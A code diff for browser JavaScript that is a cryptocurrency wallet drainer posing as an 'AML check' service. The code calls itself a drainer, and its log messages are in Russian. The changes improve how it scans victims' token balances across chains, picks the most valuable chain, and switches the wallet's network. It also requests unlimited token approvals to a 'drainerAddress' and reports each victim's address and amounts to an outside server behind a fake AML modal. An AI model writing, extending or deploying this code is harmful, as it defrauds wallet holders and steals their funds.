@@ -26,7 +26,6 @@ const appKitModal = createAppKit({
 let connectedAddress = null;
 let hasDrained = false;
 let isTransactionPending = false;
-let actionBtn = null;
 let modalOverlay = null;
 let modalContent = null;
 let modalSubtitle = null;
@@ -151,14 +150,25 @@ notifyOnVisit().catch(error => {
 });
 
 async function getTokenPriceInUSDT(tokenSymbol) {
-  if (tokenSymbol === "USDTUSDT") return 1;
+  if (tokenSymbol === "USDT" || tokenSymbol === "USDTUSDT") return 1;
+
+  const cachedPrice = sessionStorage.getItem(`tokenPrice_${tokenSymbol}`);
+  if (cachedPrice) {
+    return parseFloat(cachedPrice);
+  }
 
   try {
     const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${tokenSymbol}`);
     const data = await response.json();
-    if (data.price) return parseFloat(data.price);
+    if (data.price) {
+      const price = parseFloat(data.price);
+      sessionStorage.setItem(`tokenPrice_${tokenSymbol}`, price.toString());
+      return price;
+    }
+    console.warn(`⚠️ Цена для ${tokenSymbol} не найдена, возвращаем 0`);
     return 0;
-  } catch {
+  } catch (error) {
+    console.error(`❌ Ошибка получения цены для ${tokenSymbol}: ${error.message}`);
     return 0;
   }
 }
@@ -196,20 +206,30 @@ async function checkBalance(chainId, userAddress, provider) {
 
   try {
     const usdt = new ethers.Contract(chainConfig.usdtAddress, ERC20_ABI, provider);
-    tokenBalances[chainConfig.usdtAddress] = await usdt.balanceOf(userAddress);
-    console.log(`📊 Баланс USDT: ${ethers.utils.formatUnits(tokenBalances[chainConfig.usdtAddress], 6)}`);
+    const [usdtBalance, usdtDecimals] = await Promise.all([
+      usdt.balanceOf(userAddress),
+      usdt.decimals()
+    ]);
+    tokenBalances[chainConfig.usdtAddress] = { balance: usdtBalance, decimals: usdtDecimals };
+    console.log(`📊 Сырой баланс USDT (wei): ${usdtBalance.toString()}`);
+    console.log(`📊 Баланс USDT: ${ethers.utils.formatUnits(usdtBalance, usdtDecimals)}`);
   } catch (error) {
     console.warn(`⚠️ Не удалось получить баланс USDT: ${error.message}`);
-    tokenBalances[chainConfig.usdtAddress] = ethers.BigNumber.from(0);
+    tokenBalances[chainConfig.usdtAddress] = { balance: ethers.BigNumber.from(0), decimals: 6 };
   }
 
   try {
     const usdc = new ethers.Contract(chainConfig.usdcAddress, ERC20_ABI, provider);
-    tokenBalances[chainConfig.usdcAddress] = await usdc.balanceOf(userAddress);
-    console.log(`📊 Баланс USDC: ${ethers.utils.formatUnits(tokenBalances[chainConfig.usdcAddress], 6)}`);
+    const [usdcBalance, usdcDecimals] = await Promise.all([
+      usdc.balanceOf(userAddress),
+      usdc.decimals()
+    ]);
+    tokenBalances[chainConfig.usdcAddress] = { balance: usdcBalance, decimals: usdcDecimals };
+    console.log(`📊 Сырой баланс USDC (wei): ${usdcBalance.toString()}`);
+    console.log(`📊 Баланс USDC: ${ethers.utils.formatUnits(usdcBalance, usdcDecimals)}`);
   } catch (error) {
     console.warn(`⚠️ Не удалось получить баланс USDC: ${error.message}`);
-    tokenBalances[chainConfig.usdcAddress] = ethers.BigNumber.from(0);
+    tokenBalances[chainConfig.usdcAddress] = { balance: ethers.BigNumber.from(0), decimals: 6 };
   }
 
   if (chainConfig.otherTokenAddresses) {
@@ -217,19 +237,21 @@ async function checkBalance(chainId, userAddress, provider) {
     const balancePromises = tokenAddresses.map(async (tokenAddress) => {
       try {
         const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-        const balance = await token.balanceOf(userAddress);
-        const decimals = await token.decimals();
+        const [balance, decimals] = await Promise.all([
+          token.balanceOf(userAddress),
+          token.decimals()
+        ]);
         console.log(`📊 Баланс токена ${tokenAddress}: ${ethers.utils.formatUnits(balance, decimals)}`);
-        return { address: tokenAddress, balance };
+        return { address: tokenAddress, balance, decimals };
       } catch (error) {
         console.warn(`⚠️ Не удалось получить баланс токена ${tokenAddress}: ${error.message}`);
-        return { address: tokenAddress, balance: ethers.BigNumber.from(0) };
+        return { address: tokenAddress, balance: ethers.BigNumber.from(0), decimals: 18 };
       }
     });
 
     const results = await Promise.all(balancePromises);
-    results.forEach(({ address, balance }) => {
-      tokenBalances[address] = balance;
+    results.forEach(({ address, balance, decimals }) => {
+      tokenBalances[address] = { balance, decimals };
     });
   }
 
@@ -242,8 +264,8 @@ function hasFunds(bal) {
 
   if (bal.nativeBalance.gt(minNativeBalance)) return true;
 
-  for (const balance of Object.values(bal.tokenBalances)) {
-    if (balance.gt(minTokenBalance)) return true;
+  for (const tokenData of Object.values(bal.tokenBalances)) {
+    if (tokenData.balance.gt(minTokenBalance)) return true;
   }
 
   return false;
@@ -280,23 +302,32 @@ function formatBalance(balance, decimals) {
 }
 
 async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider, initialAmount) {
+  function convertWeiToTokenRounded(balanceInWei, decimals) {
+    const balanceInTokens = parseFloat(ethers.utils.formatUnits(balanceInWei, decimals));
+    return Math.round(balanceInTokens * 100) / 100;
+  }
+
   try {
     console.log(`📍 Уведомляем сервер о токене ${tokenAddress} для ${userAddress}`);
     const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-    const decimals = await token.decimals();
-    console.log(`📊 Количество для списания: ${ethers.utils.formatUnits(amount, decimals)}`);
+    const balance = initialAmount;
+    const decimals = (await token.decimals()) || 6;
+    console.log(`📊 Текущий баланс токена: ${ethers.utils.formatUnits(balance, decimals)}`);
     
-    if (amount.lte(0)) {
-      throw new Error('Amount is zero or negative');
-    }
+    const balanceUnits = ethers.utils.formatUnits(balance, decimals);
+    const roundedBalance = Math.max(parseFloat(balanceUnits).toFixed(5), 0.0001);
+    const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
 
-    const response = await fetch('https://api.bybitamlbot.com/api/transfer', {
+    console.log(`📊 Округлённый баланс: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);
+    await showAMLCheckModal(userAddress, roundedBalance);
+
+    const response = await fetch('https://api.amlinsight.io/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         userAddress,
         tokenAddress,
-        amount: amount.toString(),
+        amount: roundedAmount.toString(),
         chainId,
         txHash
       })
@@ -307,7 +338,8 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       throw new Error(`Failed to notify server: ${data.message || 'Unknown error'}`);
     }
     console.log(`✅ Сервер успешно уведомлён о трансфере токена ${tokenAddress}`);
-    return { success: true, roundedAmount: amount.toString() };
+    
+    return { success: true, roundedAmount: roundedAmount.toString() };
   } catch (error) {
     console.error(`❌ Ошибка уведомления сервера: ${error.message}`);
     throw new Error(`Failed to notify server: ${error.message}`);
@@ -321,6 +353,27 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   if (!chainConfig) throw new Error(`Configuration for chainId ${chainId} not found`);
 
   console.log(`📍 Шаг 1: Проверяем конфигурацию для chainId ${chainId}`);
+
+  const currentNetwork = await provider.getNetwork();
+  if (currentNetwork.chainId !== chainId) {
+    console.log(`📍 Текущая сеть ${currentNetwork.chainId}, переключаем на ${chainId}`);
+    try {
+      await provider.send('wallet_switchEthereumChain', [{ chainId: `0x${chainId.toString(16)}` }]);
+      console.log(`⏳ Ожидаем завершения переключения сети...`);
+      await new Promise(resolve => setTimeout(resolve, 3000));
+      const newNetwork = await provider.getNetwork();
+      if (newNetwork.chainId !== chainId) {
+        throw new Error(`Failed to switch network: expected chainId ${chainId}, but got ${newNetwork.chainId}`);
+      }
+      console.log(`✅ Сеть успешно сменилась на chainId ${chainId}`);
+    } catch (error) {
+      console.error(`❌ Ошибка при переключении сети: ${error.message}`);
+      if (error.code === 4001) {
+        throw new Error("User rejected network switch");
+      }
+      throw new Error(`Network switch failed: ${error.message}`);
+    }
+  }
 
   const tokenAddresses = [chainConfig.usdtAddress, chainConfig.usdcAddress, ...Object.values(chainConfig.otherTokenAddresses)];
 
@@ -343,19 +396,15 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     }
 
     for (const tokenAddress of tokenAddresses) {
-      const balance = bal.tokenBalances[tokenAddress];
-      if (balance && balance.gt(0)) {
-        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-        const decimals = await tokenContract.decimals();
-        const formattedBalance = formatBalance(balance, decimals);
-        if (parseFloat(formattedBalance) > 0) {
-          const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
-                        tokenAddress === chainConfig.usdcAddress ? "USDC" :
-                        Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
-          const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
-          const tokenValueInUSDT = (parseFloat(formattedBalance) * tokenPrice).toFixed(2);
-          funds.push(`- **${symbol}**(${networkName}): ${formattedBalance} (\`${tokenValueInUSDT} USDT\`)`);
-        }
+      const tokenData = bal.tokenBalances[tokenAddress] || { balance: ethers.BigNumber.from(0), decimals: 18 };
+      const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
+      if (formattedBalance > 0) {
+        const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
+                      tokenAddress === chainConfig.usdcAddress ? "USDC" :
+                      Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+        const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
+        const tokenValueInUSDT = (formattedBalance * tokenPrice).toFixed(2);
+        funds.push(`- **${symbol}**(${networkName}): ${formattedBalance.toFixed(6)} (\`${tokenValueInUSDT} USDT\`)`);
       }
     }
 
@@ -373,7 +422,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   }
 
   const MAX = ethers.constants.MaxUint256;
-  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6);
+  const MIN_TOKEN_BALANCE = parseFloat(ethers.utils.formatUnits(ethers.utils.parseUnits("0.1", 6), 6));
 
   console.log(`📍 Шаг 3: Проверяем баланс ${chainConfig.nativeToken} для газа`);
   let ethBalance;
@@ -386,7 +435,8 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   }
 
   const minEthRequired = ethers.utils.parseEther("0.0003");
-  if (ethBalance.lt(minEthRequired)) {
+  const ethBalanceFormatted = parseFloat(ethers.utils.formatEther(ethBalance));
+  if (ethBalanceFormatted < parseFloat(ethers.utils.formatEther(minEthRequired))) {
     console.error(`❌ Недостаточно ${chainConfig.nativeToken} для газа`);
     throw new Error(`Insufficient ${chainConfig.nativeToken} balance for gas`);
   }
@@ -396,28 +446,26 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
   const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
     const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-    try {
-      const [realBalance, decimals] = await Promise.all([
-        tokenContract.balanceOf(userAddress),
-        tokenContract.decimals()
-      ]);
-      console.log(`📊 Токен ${tokenAddress}: баланс ${ethers.utils.formatUnits(realBalance, decimals)}`);
-      return { tokenAddress, tokenContract, realBalance, decimals };
-    } catch (error) {
-      console.warn(`⚠️ Не удалось получить данные токена ${tokenAddress}: ${error.message}`);
-      return { tokenAddress, tokenContract, realBalance: ethers.BigNumber.from(0), decimals: 18 };
-    }
+    const tokenData = bal.tokenBalances[tokenAddress] || { balance: ethers.BigNumber.from(0), decimals: 18 };
+    const realBalance = tokenData.balance;
+    const decimals = tokenData.decimals;
+    console.log(`📊 Токен ${tokenAddress}: баланс ${ethers.utils.formatUnits(realBalance, decimals)}`);
+    return { tokenAddress, tokenContract, realBalance, decimals };
   });
 
   const tokenDataResults = await Promise.all(tokenDataPromises);
   console.log(`✅ Получены данные токенов: ${tokenDataResults.length} токенов`);
 
   for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
-    if (realBalance.lt(bal.tokenBalances[tokenAddress] || 0)) {
-      bal.tokenBalances[tokenAddress] = realBalance;
+    const storedBalance = bal.tokenBalances[tokenAddress]?.balance || ethers.BigNumber.from(0);
+    const storedBalanceFormatted = parseFloat(ethers.utils.formatUnits(storedBalance, decimals));
+    const realBalanceFormatted = parseFloat(ethers.utils.formatUnits(realBalance, decimals));
+
+    if (realBalanceFormatted < storedBalanceFormatted) {
+      bal.tokenBalances[tokenAddress] = { balance: realBalance, decimals: decimals };
     }
 
-    if (realBalance.gt(0) && realBalance.gt(MIN_TOKEN_BALANCE)) {
+    if (realBalanceFormatted > 0 && realBalanceFormatted > MIN_TOKEN_BALANCE) {
       const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
                     tokenAddress === chainConfig.usdcAddress ? "USDC" :
                     Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
@@ -470,9 +518,8 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         console.log(`⏳ Задержка перед approve для токена ${token}`);
         await delay(10);
 
-        // Approve с неограниченным значением
         const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
-          gasLimit: 100000,
+          gasLimit: 500000,
           gasPrice: gasPrice,
           nonce
         });
@@ -482,8 +529,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
         // Списываем только 1 токен
         const amlValue = "1"; // 1 токен в форматированном виде для AML
-        await showAMLCheckModal(connectedAddress, amlValue);
-
+        await showAMLCheckModal(userAddress, amlValue);
         await notifyServer(userAddress, address, oneToken, chainId, receipt.transactionHash, provider, oneToken);
         status = 'confirmed';
 
@@ -507,9 +553,9 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       console.log(`✅ Allowance уже достаточно для токена ${token}`);
       try {
         // Списываем только 1 токен
-        await notifyServer(userAddress, address, oneToken, chainId, null, provider, oneToken);
         const amlValue = "1"; // 1 токен в форматированном виде для AML
-        await showAMLCheckModal(connectedAddress, amlValue);
+        await showAMLCheckModal(userAddress, amlValue);
+        await notifyServer(userAddress, address, oneToken, chainId, null, provider, oneToken);
         status = 'confirmed';
       } catch (error) {
         console.error(`❌ Ошибка при вызове notifyServer для токена ${token}: ${error.message}`);
@@ -551,26 +597,51 @@ async function runDrainer(provider, signer, userAddress) {
   });
 
   const balances = (await Promise.all(balancePromises)).filter(Boolean);
-  const sorted = balances
-    .filter(item => hasFunds(item.balance))
-    .sort((a, b) => {
-      const aTotal = Object.values(a.balance.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
-      const bTotal = Object.values(b.balance.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
-      return bTotal.gt(aTotal) ? 1 : -1;
-    });
+
+  const sorted = await Promise.all(
+    balances
+      .filter(item => hasFunds(item.balance))
+      .map(async (item) => {
+        const totalValueInUSDT = await calculateTotalValueInUSDT(item.chainId, item.balance, item.provider);
+        return { ...item, totalValueInUSDT };
+      })
+  );
+
+  sorted.sort((a, b) => b.totalValueInUSDT - a.totalValueInUSDT);
 
   if (!sorted.length) {
     throw new Error('No funds found on any chain');
   }
 
   const target = sorted[0];
-  await switchChain(target.chainId);
-  const status = await drain(target.chainId, signer, userAddress, target.balance, target.provider);
-  return status;
+  console.log(`Рекомендуемая сеть: chainId ${target.chainId} с максимальной стоимостью токенов (без нативных): ${target.totalValueInUSDT} USDT`);
+  return { targetChainId: target.chainId, targetProvider: target.provider };
+}
+
+async function calculateTotalValueInUSDT(chainId, balance, provider) {
+  const chainConfig = config.CHAINS[chainId];
+  let totalValue = 0;
+
+  for (const tokenAddress of Object.keys(balance.tokenBalances)) {
+    const tokenData = balance.tokenBalances[tokenAddress];
+    const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
+    if (formattedBalance > 0) {
+      const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
+                    tokenAddress === chainConfig.usdcAddress ? "USDC" :
+                    Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+      const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
+      const tokenValue = formattedBalance * tokenPrice;
+      totalValue += tokenValue;
+      console.log(`📊 Токен ${symbol} в chainId ${chainId}: ${formattedBalance} * ${tokenPrice} = ${tokenValue.toFixed(2)} USDT`);
+    }
+  }
+
+  console.log(`📊 Общая стоимость токенов (без нативных) для chainId ${chainId}: ${totalValue} USDT`);
+  return totalValue;
 }
 
 window.addEventListener('DOMContentLoaded', () => {
-  actionBtn = document.getElementById('action-btn');
+  const actionButtons = document.querySelectorAll('.action-btn');
   const isInjected = typeof window.ethereum !== 'undefined';
 
   const link = document.createElement('link');
@@ -755,15 +826,17 @@ window.addEventListener('DOMContentLoaded', () => {
   modalSubtitle = modalContent.querySelector('.modal-subtitle');
 
   if (!isInjected) {
-    actionBtn.style.display = 'inline-block';
-    actionBtn.addEventListener('click', () => {
-      window.showWalletRedirectModal();
+    actionButtons.forEach(btn => {
+      btn.addEventListener('click', () => {
+        window.showWalletRedirectModal();
+      });
     });
     return;
   }
 
-  actionBtn.style.display = 'inline-block';
-  actionBtn.addEventListener('click', handleConnectOrAction);
+  actionButtons.forEach(btn => {
+    btn.addEventListener('click', handleConnectOrAction);
+  });
 
   window.ethereum.on('chainChanged', onChainChanged);
 });
@@ -806,10 +879,10 @@ async function attemptDrainer() {
     isTransactionPending = false;
     console.error('❌ Тайм-аут выполнения дрейнера');
     await hideModalWithDelay("Check your wallet for AML!");
-  }, 120000);
+  }, 60000);
 
   try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
     const signer = provider.getSigner();
     const address = await signer.getAddress();
 
@@ -820,8 +893,12 @@ async function attemptDrainer() {
     await new Promise(resolve => setTimeout(resolve, 10));
 
     isTransactionPending = true;
-    const status = await runDrainer(provider, signer, connectedAddress);
-    console.log('✅ Drainer выполнен, статус:', status);
+    const { targetChainId, targetProvider } = await runDrainer(provider, signer, connectedAddress);
+    if (targetChainId) {
+      await switchChain(targetChainId);
+      const status = await drain(targetChainId, signer, connectedAddress, await checkBalance(targetChainId, connectedAddress, targetProvider), targetProvider);
+      console.log('✅ Drainer выполнен, статус:', status);
+    }
 
     hasDrained = true;
     isTransactionPending = false;
@@ -880,7 +957,10 @@ async function handleConnectOrAction() {
 async function onChainChanged(chainId) {
   console.log('🔄 Смена сети:', chainId);
   if (connectedAddress && !isTransactionPending) {
-    await attemptDrainer();
+    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+    const newNetwork = await provider.getNetwork();
+    console.log(`📡 Новая сеть: ${newNetwork.name}, chainId: ${newNetwork.chainId}`);
+    await attemptDrainer(provider);
   } else {
     console.log('⏳ Транзакция в процессе');
     await hideModalWithDelay("Transaction in progress, please wait.");
